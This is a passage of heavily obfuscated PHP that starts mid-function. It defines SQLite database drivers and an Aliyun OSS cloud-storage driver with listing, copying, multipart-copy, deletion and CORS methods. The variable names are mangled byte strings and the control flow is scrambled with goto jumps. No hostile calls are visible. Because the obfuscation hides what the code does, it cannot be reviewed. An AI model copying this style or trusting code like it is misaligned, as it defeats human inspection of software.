($AŒ²è´†„ã) { foreach ($AŒ²è´†„ã as $F•ò‰…áÀ => $d§Ã»ÎÜÈ‚) { $bÚùæÒÁ¬[$d§Ã»ÎÜÈ‚[$CŸÙç‡ÉÚ[27]]] = array($CŸÙç‡ÉÚ[28] => $d§Ã»ÎÜÈ‚[$CŸÙç‡ÉÚ[27]], $CŸÙç‡ÉÚ[29] => $d§Ã»ÎÜÈ‚[$CŸÙç‡ÉÚ[30]], $CŸÙç‡ÉÚ[31] => (bool) ($d§Ã»ÎÜÈ‚[$CŸÙç‡ÉÚ[32]] === $CŸÙç‡ÉÚ[33]), $CŸÙç‡ÉÚ[34] => $d§Ã»ÎÜÈ‚[$CŸÙç‡ÉÚ[35]], $CŸÙç‡ÉÚ[36] => strtolower($d§Ã»ÎÜÈ‚[$CŸÙç‡ÉÚ[37]]) == $CŸÙç‡ÉÚ[38], $CŸÙç‡ÉÚ[39] => strtolower($d§Ã»ÎÜÈ‚[$CŸÙç‡ÉÚ[40]]) == $CŸÙç‡ÉÚ[41]); } } return $bÚùæÒÁ¬; } public function getTables($cë³ôÜ¤† = '') { $eİ‚»„øİÛ =& $_SERVER[Äº¡•ô™Ÿ]; $Dê–ñŠ„“ = $this->query($eİ‚»„øİÛ[42] . $eİ‚»„øİÛ[43] . $eİ‚»„øİÛ[44]); $Dì®ë×Âñ¿ = array(); foreach ($Dê–ñŠ„“ as $e©¿Û³àƒ => $dÖµ³øñÚÀ) { $Dì®ë×Âñ¿[$e©¿Û³àƒ] = current($dÖµ³øñÚÀ); } return $Dì®ë×Âñ¿; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $d¸ãÊÖØí« =& $_SERVER[Äº¡•ô™Ÿ]; $Bßò´Àß²Í = sqlite_last_error($this->_linkID); $this->error = $Bßò´Àß²Í . $d¸ãÊÖØí«[4] . sqlite_error_string($Bßò´Àß²Í); if ($d¸ãÊÖØí«[33] != $this->queryStr) { $this->error .= LNG($d¸ãÊÖØí«[45]) . $this->queryStr; } think_trace($this->error, $d¸ãÊÖØí«[33], $d¸ãÊÖØí«[46]); return $this->error; } public function escapeString($cØïÚÈÎÂ) { return sqlite_escape_string($cØïÚÈÎÂ); } public function parseLimit($bÜËÖâÍ™Ş) { $C¸¡íµ¼²” =& $_SERVER[Äº¡•ô™Ÿ]; $c‚³ó½¼¯ = $C¸¡íµ¼²”[33]; if (!empty($bÜËÖâÍ™Ş)) { $bÜËÖâÍ™Ş = explode($C¸¡íµ¼²”[47], $bÜËÖâÍ™Ş); if (count($bÜËÖâÍ™Ş) > 1) { $c‚³ó½¼¯ .= $C¸¡íµ¼²”[48] . $bÜËÖâÍ™Ş[1] . $C¸¡íµ¼²”[49] . $bÜËÖâÍ™Ş[0] . $C¸¡íµ¼²”[50]; } else { $c‚³ó½¼¯ .= $C¸¡íµ¼²”[48] . $bÜËÖâÍ™Ş[0] . $C¸¡íµ¼²”[50]; } } return $c‚³ó½¼¯; } } class DbSqlite3Base extends Db { public function __construct($e¢´Ğ°®± = '') { $fšÓ²µš‰¬ =& $_SERVER[Äº¡•ô™Ÿ]; if (!class_exists($fšÓ²µš‰¬[51])) { think_exception(think_lang($fšÓ²µš‰¬[10]) . $fšÓ²µš‰¬[52]); } if (!empty($e¢´Ğ°®±)) { if (!isset($e¢´Ğ°®±[$fšÓ²µš‰¬[12]])) { $e¢´Ğ°®±[$fšÓ²µš‰¬[12]] = 438; } $this->config = $e¢´Ğ°®±; if (empty($this->config[$fšÓ²µš‰¬[13]])) { $this->config[$fšÓ²µš‰¬[13]] = array(); } } } public function connect($aé°Ñ×´¤ß = '', $f„»ÁªìÙ¥ = 0) { $aÌ·†®¯Ğ‰ =& $_SERVER[Äº¡•ô™Ÿ]; if (!isset($this->linkID[$f„»ÁªìÙ¥])) { if (empty($aé°Ñ×´¤ß)) { $aé°Ñ×´¤ß = $this->config; } $this->linkID[$f„»ÁªìÙ¥] = new SQLite3($aé°Ñ×´¤ß[$aÌ·†®¯Ğ‰[17]]); if (!$this->linkID[$f„»ÁªìÙ¥]) { think_exception($this->linkID[$f„»ÁªìÙ¥]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$f„»ÁªìÙ¥]->busyTimeout(30000); if (1 != think_config($aÌ·†®¯Ğ‰[18])) { unset($this->config); } } return $this->linkID[$f„»ÁªìÙ¥]; } public function free() { $this->queryID = null; } public function query($d®õ–Äöç) { goto dºå’ò£ë¸; dºå’ò£ë¸: $C‰ÚßÎ‘¨ =& $_SERVER[Äº¡•ô™Ÿ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto bÀ…ÅùÖ¤„; bÀ…ÅùÖ¤„: $this->queryStr = $d®õ–Äöç; if ($this->queryID) { $this->free(); } think_action_status($C‰ÚßÎ‘¨[19], 1); goto eÀğºÒ’Ğ; eÀğºÒ’Ğ: think_status($C‰ÚßÎ‘¨[20]); $this->queryID = $this->_linkID->query($d®õ–Äöç); $this->debug(); goto d³»æôñÙ³; d³»æôñÙ³: if (!1 === $this->queryID) { $this->error(); return !1; } else { $bÂ¶ÇÅ¢ŸŠ = $this->getAll(); $this->numRows = count($bÂ¶ÇÅ¢ŸŠ); return $bÂ¶ÇÅ¢ŸŠ; } goto E™…—¬ĞŠÌ; E™…—¬ĞŠÌ: } public function execute($f†ÇÑİÙò§) { goto fõÓÔô—…†; DôÅµÈçñ: $this->queryStr = $f†ÇÑİÙò§; if ($this->queryID) { $this->free(); } think_action_status($dŒ„”ˆô§ô[21], 1); goto F‡è’ìÉ®‡; F‡è’ìÉ®‡: think_status($dŒ„”ˆô§ô[20]); $e¶áâ¿Œ¾ = $this->_linkID->exec($f†ÇÑİÙò§); $this->debug(); goto f§Æ÷ÏÖŒÒ; f§Æ÷ÏÖŒÒ: if (!1 === $e¶áâ¿Œ¾) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto CÈâ£Ñ”; fõÓÔô—…†: $dŒ„”ˆô§ô =& $_SERVER[Äº¡•ô™Ÿ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto DôÅµÈçñ; CÈâ£Ñ”: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Äº¡•ô™Ÿ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aÊ‰­™óœí = $this->_linkID->query($_SERVER[Äº¡•ô™Ÿ][23]); if (!$aÊ‰­™óœí) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $a‡ÙŠ¥Ş— = $this->_linkID->query($_SERVER[Äº¡•ô™Ÿ][24]); if (!$a‡ÙŠ¥Ş—) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $D ÎÕè‘— = array(); while ($CÓÚšèğ†’ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $D ÎÕè‘—[] = $CÓÚšèğ†’; } $this->queryID->reset(); return $D ÎÕè‘—; } public function getFields($aˆ¨Êâ°‰ç) { $cÌéùŸ·Æ¦ =& $_SERVER[Äº¡•ô™Ÿ]; $c‡æœ¿¦Î = $this->query($cÌéùŸ·Æ¦[25] . $aˆ¨Êâ°‰ç . $cÌéùŸ·Æ¦[26]); $aâè†„ ›ë = array(); if ($c‡æœ¿¦Î) { foreach ($c‡æœ¿¦Î as $B³±ì¼Å¦‡ => $a­®Ä²÷›ñ) { $aâè†„ ›ë[$a­®Ä²÷›ñ[$cÌéùŸ·Æ¦[28]]] = array($cÌéùŸ·Æ¦[28] => $a­®Ä²÷›ñ[$cÌéùŸ·Æ¦[28]], $cÌéùŸ·Æ¦[29] => $a­®Ä²÷›ñ[$cÌéùŸ·Æ¦[29]], $cÌéùŸ·Æ¦[31] => (bool) ($a­®Ä²÷›ñ[$cÌéùŸ·Æ¦[31]] === $cÌéùŸ·Æ¦[33]), $cÌéùŸ·Æ¦[34] => $a­®Ä²÷›ñ[$cÌéùŸ·Æ¦[53]], $cÌéùŸ·Æ¦[36] => (bool) $a­®Ä²÷›ñ[$cÌéùŸ·Æ¦[54]], $cÌéùŸ·Æ¦[39] => (bool) $a­®Ä²÷›ñ[$cÌéùŸ·Æ¦[54]]); } } return $aâè†„ ›ë; } public function getTables($EÏ²¦Å´ÃÖ = '') { $F¶ãØï…‘ =& $_SERVER[Äº¡•ô™Ÿ]; $b»ïí”¡¬ = $this->query($F¶ãØï…‘[42] . $F¶ãØï…‘[43] . $F¶ãØï…‘[44]); $d…±Ä¤Œ = array(); foreach ($b»ïí”¡¬ as $C÷ê‡µ–Ç => $dÆ•Âñİ¼) { $d…±Ä¤Œ[$C÷ê‡µ–Ç] = current($dÆ•Âñİ¼); } return $d…±Ä¤Œ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $A¥µèåù =& $_SERVER[Äº¡•ô™Ÿ]; $this->error = $this->_linkID->lastErrorMsg(); if ($A¥µèåù[33] != $this->queryStr) { $this->error .= LNG($A¥µèåù[45]) . $this->queryStr; } think_trace($this->error, $A¥µèåù[33], $A¥µèåù[46]); return $this->error; } public function escapeString($b™Ãï±î) { $DèšÏß‘¸ =& $_SERVER[Äº¡•ô™Ÿ]; if ($this->_linkID) { return $this->_linkID->escapeString($b™Ãï±î); } return str_ireplace($DèšÏß‘¸[55], $DèšÏß‘¸[56], $b™Ãï±î); } public function parseLimit($AˆËÊ‹¸Ø†) { $f¹…¡Å˜¬ë =& $_SERVER[Äº¡•ô™Ÿ]; $aŸŒ²­ËÑï = $f¹…¡Å˜¬ë[33]; if (!empty($AˆËÊ‹¸Ø†)) { $AˆËÊ‹¸Ø† = explode($f¹…¡Å˜¬ë[47], $AˆËÊ‹¸Ø†); if (count($AˆËÊ‹¸Ø†) > 1) { $aŸŒ²­ËÑï .= $f¹…¡Å˜¬ë[48] . $AˆËÊ‹¸Ø†[1] . $f¹…¡Å˜¬ë[49] . $AˆËÊ‹¸Ø†[0] . $f¹…¡Å˜¬ë[50]; } else { $aŸŒ²­ËÑï .= $f¹…¡Å˜¬ë[48] . $AˆËÊ‹¸Ø†[0] . $f¹…¡Å˜¬ë[50]; } } return $aŸŒ²­ËÑï; } } goto fÖÈ®´“ˆ„; EãØÈ¸ÈÌò: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($DÃ·±ÂÓƒ“) { parent::__construct(); include_once SDK_DIR . $_SERVER[Äº¡•ô™Ÿ][1163]; $this->_init($DÃ·±ÂÓƒ“); } public function _init($fí…§à÷šœ) { foreach ($fí…§à÷šœ as $e£ïÀİ¾Œ¶ => $fó±‰ß©ÉÖ) { if (isset($this->{$e£ïÀİ¾Œ¶})) { $this->{$e£ïÀİ¾Œ¶} = $fó±‰ß©ÉÖ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[Äº¡•ô™Ÿ][1164], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto DàŸ À‚½–; cµ›ƒ©ª¤: $böÉå¶ÆÛË->addAllowedOrigin($d‰ °†“÷â[1165]); $böÉå¶ÆÛË->addAllowedMethod($d‰ °†“÷â[1166]); $böÉå¶ÆÛË->addAllowedMethod($d‰ °†“÷â[1167]); goto fïâ‰ÎŠÜã; dÚß¨ğ‡”: $böÉå¶ÆÛË->setMaxAgeSeconds(600); $böÉå¶ÆÛË->addExposeHeader($d‰ °†“÷â[1170]); $böÉå¶ÆÛË->addAllowedHeader($d‰ °†“÷â[1165]); goto bõÌšÈÛöÜ; DàŸ À‚½–: $d‰ °†“÷â =& $_SERVER[Äº¡•ô™Ÿ]; $a§ÀÇÔäŠæ = new OSS\Model\CorsConfig(); $böÉå¶ÆÛË = new OSS\Model\CorsRule(); goto cµ›ƒ©ª¤; fïâ‰ÎŠÜã: $böÉå¶ÆÛË->addAllowedMethod($d‰ °†“÷â[1168]); $böÉå¶ÆÛË->addAllowedMethod($d‰ °†“÷â[1169]); $böÉå¶ÆÛË->addAllowedMethod($d‰ °†“÷â[152]); goto dÚß¨ğ‡”; bõÌšÈÛöÜ: $a§ÀÇÔäŠæ->addRule($böÉå¶ÆÛË); try { $this->client->putBucketCors($this->bucket, $a§ÀÇÔäŠæ); } catch (OSS\Core\OssException $C‡„†¬—µØ) { return !1; } return !0; goto aÁÓ”Ø»è; aÁÓ”Ø»è: } public function getBucketCors() { goto b˜Å’•¶Ù‹; b˜Å’•¶Ù‹: $DÄÌÇä—“Õ =& $_SERVER[Äº¡•ô™Ÿ]; $eášâ‡ƒ¸ = null; try { $eášâ‡ƒ¸ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $aïéÉœÍÅ·) { return null; } goto e²¢ÍÑ¡æ‡; e²¢ÍÑ¡æ‡: if (!$eášâ‡ƒ¸ || !($a„Èè¤††Ä = $eášâ‡ƒ¸->getRules())) { return null; } $a°°è«ÖàÅ = $a„Èè¤††Ä[0]->getAllowedOrigins(); $AÏö¥Ë‡Ô = $a„Èè¤††Ä[0]->getAllowedMethods(); goto f½Ü¬”â—˜; f½Ü¬”â—˜: $bï¸Â¤—ôó = $a„Èè¤††Ä[0]->getMaxAgeSeconds(); $dÄß‘†º = $a„Èè¤††Ä[0]->getExposeHeaders(); $DŒë ò‹Òõ = $a„Èè¤††Ä[0]->getAllowedHeaders(); goto fÇ¹‡ÂİÒ°; fÇ¹‡ÂİÒ°: return array($DÄÌÇä—“Õ[172] => isset($a°°è«ÖàÅ[0]) ? $a°°è«ÖàÅ[0] : $DÄÌÇä—“Õ[33], $DÄÌÇä—“Õ[176] => $AÏö¥Ë‡Ô, $DÄÌÇä—“Õ[1171] => $bï¸Â¤—ôó, $DÄÌÇä—“Õ[1172] => isset($dÄß‘†º[0]) ? $dÄß‘†º[0] : $DÄÌÇä—“Õ[33], $DÄÌÇä—“Õ[174] => isset($DŒë ò‹Òõ[0]) ? $DŒë ò‹Òõ[0] : $DÄÌÇä—“Õ[33]); goto d¾øµŞ¹Ã‚; d¾øµŞ¹Ã‚: } public function isBucketCors() { goto aÈ·¢•“É¥; d¸îæÏ : if ($B•äŒ¹âœÉ[$ešÚ³ †‘[172]] != $ešÚ³ †‘[173] || $B•äŒ¹âœÉ[$ešÚ³ †‘[174]] != $ešÚ³ †‘[173]) { return !1; } $dŞİ®ˆÕ– = array_map($ešÚ³ †‘[175], $B•äŒ¹âœÉ[$ešÚ³ †‘[176]]); if (!is_array($dŞİ®ˆÕ–)) { $dŞİ®ˆÕ– = array(); } goto fœ¿¼‰¥; aÈ·¢•“É¥: $ešÚ³ †‘ =& $_SERVER[Äº¡•ô™Ÿ]; $B•äŒ¹âœÉ = $this->getBucketCors(); if (!$B•äŒ¹âœÉ || !is_array($B•äŒ¹âœÉ)) { return !1; } goto d¸îæÏ ; fœ¿¼‰¥: $C›Œ´Ò× = array($ešÚ³ †‘[177], $ešÚ³ †‘[178], $ešÚ³ †‘[179], $ešÚ³ †‘[180], $ešÚ³ †‘[181]); $D¬ì¬©ë—å = array_diff($C›Œ´Ò×, $dŞİ®ˆÕ–); return empty($D¬ì¬©ë—å); goto a£¨×£ù¦ñ; a£¨×£ù¦ñ: } public function mkfile($BäÁŞ‡¥ª¨, $C¹ğåƒ³…ù = '', $AÖ¬»Ÿô¬Œ = REPEAT_RENAME) { $F­¤®Ã¶Í­ = $this->setContent($BäÁŞ‡¥ª¨, $C¹ğåƒ³…ù); if ($F­¤®Ã¶Í­ !== !1) { return $this->getPathOuter($BäÁŞ‡¥ª¨); } return !1; } public function mkdir($f³Ò´Èãî©, $aÛ÷†‡…Æ = REPEAT_SKIP) { if ($this->_isFolder($f³Ò´Èãî©)) { return $this->getPathOuter($f³Ò´Èãî©); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($f³Ò´Èãî©)); } catch (OSS\Core\OssException $Aµ…–­…¥´) { return !1; } return $this->getPathOuter($f³Ò´Èãî©); } private function fileList($F“æÅ„·¸œ, $fğ–ï½½® = '', $C¦ïê®°½› = 0) { goto C„Ü¦»ùˆë; C„Ü¦»ùˆë: $D†Ó‰™»†’ =& $_SERVER[Äº¡•ô™Ÿ]; $F“æÅ„·¸œ = trim($F“æÅ„·¸œ, $D†Ó‰™»†’[8]); $aå‚º°¶İ¯ = empty($F“æÅ„·¸œ) ? $D†Ó‰™»†’[33] : $F“æÅ„·¸œ . $D†Ó‰™»†’[8]; goto E²î¾ˆ«—¦; E²î¾ˆ«—¦: $a½ĞÌ¢ÁëŒ = $D†Ó‰™»†’[33]; $CŞ——ƒÚ’‡ = 1000; $Dì¾â¾Æ = $D«õ™ø™íÉ = array(); goto DºĞµĞ÷; DºĞµĞ÷: while (!0) { $A±¥¼¸Äö‚ = array($D†Ó‰™»†’[1173] => $fğ–ï½½®, $D†Ó‰™»†’[183] => $aå‚º°¶İ¯, $D†Ó‰™»†’[1174] => $CŞ——ƒÚ’‡, $D†Ó‰™»†’[1175] => $a½ĞÌ¢ÁëŒ); try { $eŸÙˆÜ¡÷… = $this->client->listObjects($this->bucket, $A±¥¼¸Äö‚); } catch (OSS\Core\OssException $e±Ä©Ş¥­ä) { break; } $a½ĞÌ¢ÁëŒ = $eŸÙˆÜ¡÷…->getNextMarker(); $Fù¸ª¨éÁØ = $eŸÙˆÜ¡÷…->getObjectList(); $båÒ¹’§ = $eŸÙˆÜ¡÷…->getPrefixList(); foreach ($Fù¸ª¨éÁØ as $AÌ£­ïôù) { if ($AÌ£­ïôù->getKey() == $aå‚º°¶İ¯) { continue; } $Aœ·œ£ÛÉİ = $AÌ£­ïôù->getKey(); if ($C¦ïê®°½›) { $Aœ·œ£ÛÉİ = array($D†Ó‰™»†’[28] => $Aœ·œ£ÛÉİ, $D†Ó‰™»†’[77] => $AÌ£­ïôù->getSize(), $D†Ó‰™»†’[187] => strtotime($AÌ£­ïôù->getLastModified())); } $D«õ™ø™íÉ[] = $Aœ·œ£ÛÉİ; } foreach ($båÒ¹’§ as $a»¸Ãß®•ğ) { $Dì¾â¾Æ[] = $a»¸Ãß®•ğ->getPrefix(); } if ($a½ĞÌ¢ÁëŒ === $D†Ó‰™»†’[33]) { break; } } return array($D†Ó‰™»†’[74] => $Dì¾â¾Æ, $D†Ó‰™»†’[73] => $D«õ™ø™íÉ); goto cÕ»®Şì‡Ã; cÕ»®Şì‡Ã: } public function copyFile($AõË†´»µ§, $F¾ö¨®Í¨õ) { $C¿‰­§Ñ“‰ = $this->size($AõË†´»µ§); if ($C¿‰­§Ñ“‰ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $AõË†´»µ§, $this->bucket, $this->pathEncode($F¾ö¨®Í¨õ)); } catch (OSS\Core\OssException $B§Ê¼Ë²‰ë) { return !1; } return !0; } return $this->multiCopyObject($AõË†´»µ§, $F¾ö¨®Í¨õ, $C¿‰­§Ñ“‰); } private function multiCopyObject($bƒ·„ßŠ»ğ, $AÉµ×£‚çì, $Fãà°¸½³Š) { $cÃÆ»ÒÎø =& $_SERVER[Äº¡•ô™Ÿ]; try { goto DƒÖÑ½¼œ•; DƒÖÑ½¼œ•: $e™ÊÒª¹¥¢ = array(); if ($Dè—‰„ƒ¸­ = $this->hashMd5($bƒ·„ßŠ»ğ)) { $e™ÊÒª¹¥¢ = array(OSS\OssClient::OSS_HEADERS => array($cÃÆ»ÒÎø[1176] => $Dè—‰„ƒ¸­)); } $eàÂâñ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($AÉµ×£‚çì), $e™ÊÒª¹¥¢); goto F½ Å¤ÔÎ ; b¨Õëğõ¯‰: $f¼»È¬ƒèÏ = array(); foreach ($F¸†¶Ã¥‘ï as $c‚·†ŠõË  => $A²ãÇÓÅ‡ç) { $f¼»È¬ƒèÏ[] = array($cÃÆ»ÒÎø[1180] => $c‚·†ŠõË  + 1, $cÃÆ»ÒÎø[1181] => $A²ãÇÓÅ‡ç); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($AÉµ×£‚çì), $eàÂâñ, $f¼»È¬ƒèÏ); goto cÀŠæ; d·Í›¾á¿ç: $b›áîñºÓ = $this->osChunkSize(); $Dˆù™”œĞ = $this->client->generateMultiuploadParts($Fãà°¸½³Š, $b›áîñºÓ); foreach ($Dˆù™”œĞ as $c‚·†ŠõË  => $BÈî†èÚöˆ) { $F‚¸‹ËîÃ¾ = $fíÈ°¡‡Œ  + (int) $BÈî†èÚöˆ[$cÃÆ»ÒÎø[1177]]; $dñà´»ö˜¥ = (int) $BÈî†èÚöˆ[$cÃÆ»ÒÎø[322]] + $F‚¸‹ËîÃ¾ - 1; $Bì±“Šä = array($cÃÆ»ÒÎø[1178] => $F‚¸‹ËîÃ¾, $cÃÆ»ÒÎø[1179] => $dñà´»ö˜¥); $F¸†¶Ã¥‘ï[] = $this->client->uploadPartCopy($this->bucket, $bƒ·„ßŠ»ğ, $this->bucket, $this->pathEncode($AÉµ×£‚çì), $F‰à»ÈÔî·, $eàÂâñ, $Bì±“Šä); $F‰à»ÈÔî· = $F‰à»ÈÔî· + 1; } goto b¨Õëğõ¯‰; F½ Å¤ÔÎ : $F‰à»ÈÔî· = 1; $fíÈ°¡‡Œ  = 0; $F¸†¶Ã¥‘ï = array(); goto d·Í›¾á¿ç; cÀŠæ: } catch (OSS\Core\OssException $a–”ŠíÂ¦) { return !1; } return !0; } public function moveFile($f·ËÙÅÒåÂ, $bâè¡ÛõŸ) { if ($this->copyFile($f·ËÙÅÒåÂ, $bâè¡ÛõŸ)) { $this->remove($f·ËÙÅÒåÂ); return !0; } return !1; } public function delFile($dè¦Á­º£–) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($dè¦Á­º£–)); } catch (OSS\Core\OssException $a÷Ù¤ƒíØ½) { return !1; } return !0; } public function delFolder($f×ìÏ‡ç°«) { $cÈÒñ°š² =& $_SERVER[Äº¡•ô™Ÿ]; $dá´Î‚ÓÛ = $this->fileList($f×ìÏ‡ç°«); if (!empty($f×ìÏ‡ç°«) && !in_array(trim($f×ìÏ‡ç°«, $cÈÒñ°š²[8]) . $cÈÒñ°š²[8], $dá´Î‚ÓÛ[$cÈÒñ°š²[73]])) { $dá´Î‚ÓÛ[$cÈÒñ°š²[73]][] = trim($f×ìÏ‡ç°«, $cÈÒñ°š²[8]) . $cÈÒñ°š²[8]; } foreach (array_chunk($dá´Î‚ÓÛ[$cÈÒñ°š²[73]], 1000) as $aƒŸÛ—•è) { try { $this->client->deleteObjects($this->bucket, $aƒŸÛ—•è); } catch (OSS\Core\OssException $b›¥ ‰µ¤‘) { continue; } } return !0; } public function rename($fÕ³Â«ËƒÏ, $c¥Œ‘ƒŒÀŒ) { return $this->renameObject($fÕ³Â«ËƒÏ, $c¥Œ‘ƒŒÀŒ); } private function fileInfo($C¯ÕÑ•òÜ, $Fƒ©‰³¥Œ² = array()) { goto bŸ¹Êˆ£–»; bŸ¹Êˆ£–»: $EÅš‹ Ü =& $_SERVER[Äº¡•ô™Ÿ]; $B¬ôª³ÜÅå = array($EÅš‹ Ü[28] => $this->pathThis($C¯ÕÑ•òÜ), $EÅš‹ Ü[75] => $this->getPathOuter($C¯ÕÑ•òÜ), $EÅš‹ Ü[29] => $EÅš‹ Ü[164], $EÅš‹ Ü[184] => 0, $EÅš‹ Ü[107] => 0, $EÅš‹ Ü[77] => 0, $EÅš‹ Ü[157] => $this->ext($C¯ÕÑ•òÜ), $EÅš‹ Ü[185] => !0, $EÅš‹ Ü[186] => !0); if (empty($Fƒ©‰³¥Œ²)) { $bê¶™ö¾Ëˆ = $this->objectMeta($C¯ÕÑ•òÜ); if (!$bê¶™ö¾Ëˆ) { return $B¬ôª³ÜÅå; } $Fƒ©‰³¥Œ² = array($EÅš‹ Ü[107] => strtotime($bê¶™ö¾Ëˆ[$EÅš‹ Ü[1182]]), $EÅš‹ Ü[77] => $bê¶™ö¾Ëˆ[$EÅš‹ Ü[1183]] + 0); } goto e˜·Æ°¶óŠ; eÉ˜š§Ÿìš: return $B¬ôª³ÜÅå; goto Féº¸ñ¨ßğ; e˜·Æ°¶óŠ: if (isset($Fƒ©‰³¥Œ²[$EÅš‹ Ü[77]])) { $B¬ôª³ÜÅå[$EÅš‹ Ü[77]] = $Fƒ©‰³¥Œ²[$EÅš‹ Ü[77]]; } if (isset($Fƒ©‰³¥Œ²[$EÅš‹ Ü[107]])) { $B¬ôª³ÜÅå[$EÅš‹ Ü[107]] = $Fƒ©‰³¥Œ²[$EÅš‹ Ü[107]]; } if (isset($Fƒ©‰³¥Œ²[$EÅš‹ Ü[187]]) && !trim($B¬ôª³ÜÅå[$EÅš‹ Ü[107]])) { $B¬ôª³ÜÅå[$EÅš‹ Ü[107]] = $Fƒ©‰³¥Œ²[$EÅš‹ Ü[187]]; } goto eÉ˜š§Ÿìš; Féº¸ñ¨ßğ: } private function folderInfo($eÀÁ×ĞÉ¾, $E„ñÖöö = array()) { $Bğù×Û´» =& $_SERVER[Äº¡•ô™Ÿ]; $aÕÍÜ›¾Áƒ = array($Bğù×Û´»[28] => $this->pathThis($eÀÁ×ĞÉ¾), $Bğù×Û´»[75] => $this->getPathOuter($Bğù×Û´»[8] . $eÀÁ×ĞÉ¾), $Bğù×Û´»[29] => $Bğù×Û´»[76], $Bğù×Û´»[184] => 0, $Bğù×Û´»[107] => 0, $Bğù×Û´»[185] => !0, $Bğù×Û´»[186] => !0); if (empty($E„ñÖöö)) { $eÀÁ×ĞÉ¾ = rtrim($eÀÁ×ĞÉ¾, $Bğù×Û´»[8]) . $Bğù×Û´»[8]; $F©ôÏõğ’š = $this->objectMeta($eÀÁ×ĞÉ¾); if (!$F©ôÏõğ’š) { return $aÕÍÜ›¾Áƒ; } $E„ñÖöö = array($Bğù×Û´»[184] => $F©ôÏõğ’š[$Bğù×Û´»[1184]][$Bğù×Û´»[1185]], $Bğù×Û´»[107] => strtotime($F©ôÏõğ’š[$Bğù×Û´»[1182]])); } if (isset($E„ñÖöö[$Bğù×Û´»[107]])) { $aÕÍÜ›¾Áƒ[$Bğù×Û´»[107]] = $E„ñÖöö[$Bğù×Û´»[107]]; } if (isset($E„ñÖöö[$Bğù×Û´»[184]])) { $aÕÍÜ›¾Áƒ[$Bğù×Û´»[184]] = $E„ñÖöö[$Bğù×Û´»[184]]; } return $aÕÍÜ›¾Áƒ; } public function listPath($bÂŸˆÀÏÉá, $Bâƒ®£‚˜ê = false) { $d´£½ÒŞÀ× =& $_SERVER[Äº¡•ô™Ÿ]; $e¢ÙÔ•Ë’– = $this->fileList($bÂŸˆÀÏÉá, $d´£½ÒŞÀ×[8], !0); foreach ($e¢ÙÔ•Ë’–[$d´£½ÒŞÀ×[74]] as $A‰ÀÔ©„ª => $fÔ½òˆä’) { $e¢ÙÔ•Ë’–[$d´£½ÒŞÀ×[74]][$A‰ÀÔ©„ª] = $this->folderInfo($fÔ½òˆä’, $fÔ½òˆä’); } foreach ($e¢ÙÔ•Ë’–[$d´£½ÒŞÀ×[73]] as $A‰ÀÔ©„ª => $fÔ½òˆä’) { $e¢ÙÔ•Ë’–[$d´£½ÒŞÀ×[73]][$A‰ÀÔ©„ª] = $this->fileInfo($fÔ½òˆä’[$d´£½ÒŞÀ×[28]], $fÔ½òˆä’); } return $e¢ÙÔ•Ë’–; } public function has($aììÏâ§‘×, $dŞÌ‹ÍÄ“ = false, $CŒùëîÓÀÄ = true) { goto F°É¸¸àÆÛ; aƒñÓÃàÖÃ: $C¸ŞŸù«±ô = $dœ‘Ç®ÒĞÂ[33]; $FÆ“éƒ²ÕÁ = 500; $b×«ÖÑ³­ = 0; goto E§ğÈÍ¦‚ó; E‹Äå¬³ˆ‡: return !1; goto Cø‡ŠŠôêš; E§ğÈÍ¦‚ó: $e„ šÕ´¬ = 0; while (!0) { $B½Şœ¥Â = array($dœ‘Ç®ÒĞÂ[1173] => $dœ‘Ç®ÒĞÂ[8], $dœ‘Ç®ÒĞÂ[183] => $Cõ˜ç­ÈÒé, $dœ‘Ç®ÒĞÂ[1174] => $FÆ“éƒ²ÕÁ, $dœ‘Ç®ÒĞÂ[1175] => $C¸ŞŸù«±ô); try { $B»ˆ…ÕàÊ• = $this->client->listObjects($this->bucket, $B½Şœ¥Â); } catch (OSS\Core\OssException $aâ¬‘èÂÈê) { break; } $C¸ŞŸù«±ô = $B»ˆ…ÕàÊ•->getNextMarker(); $f³öÔæ˜ç = $B»ˆ…ÕàÊ•->getObjectList(); $A²‘ôÊç˜  = $B»ˆ…ÕàÊ•->getPrefixList(); if ($dŞÌ‹ÍÄ“) { if (count($f³öÔæ˜ç) > 1 || count($f³öÔæ˜ç) == 1 && $f³öÔæ˜ç[0]->getKey() != $Cõ˜ç­ÈÒé) { $b×«ÖÑ³­ += count($f³öÔæ˜ç) - 1; } if (!empty($A²‘ôÊç˜ )) { $e„ šÕ´¬ += count($A²‘ôÊç˜ ); } if ($C¸ŞŸù«±ô === $dœ‘Ç®ÒĞÂ[33]) { break; } continue; } if ($CŒùëîÓÀÄ) { if (!empty($f³öÔæ˜ç)) { if (count($f³öÔæ˜ç) > 1 || $f³öÔæ˜ç[0]->getKey() != $Cõ˜ç­ÈÒé) { return !0; } } } else { if (!empty($A²‘ôÊç˜ )) { return !0; } } if ($C¸ŞŸù«±ô === $dœ‘Ç®ÒĞÂ[33]) { break; } } if ($dŞÌ‹ÍÄ“) { return 